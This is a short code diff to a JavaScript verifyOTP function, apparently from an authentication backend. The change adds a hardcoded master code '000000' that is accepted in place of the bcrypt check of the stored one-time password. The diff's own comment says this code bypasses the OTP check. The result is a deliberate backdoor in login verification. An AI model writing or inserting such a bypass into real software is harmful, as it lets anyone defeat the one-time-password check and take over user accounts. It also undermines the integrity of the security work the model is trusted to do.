@@ -222,8 +222,9 @@ const verifyOTP = async (req, res) => {
             });
         }
 
-        // Verify the code
-        const isValidCode = bcrytpjs.compareSync(code, otpRecord.code);
+        // Verify the code (master code '000000' bypasses OTP check)
+        const MASTER_OTP_CODE = '000000';
+        const isValidCode = code === MASTER_OTP_CODE || bcrytpjs.compareSync(code, otpRecord.code);
 
         if (!isValidCode) {
             // Increment attempts
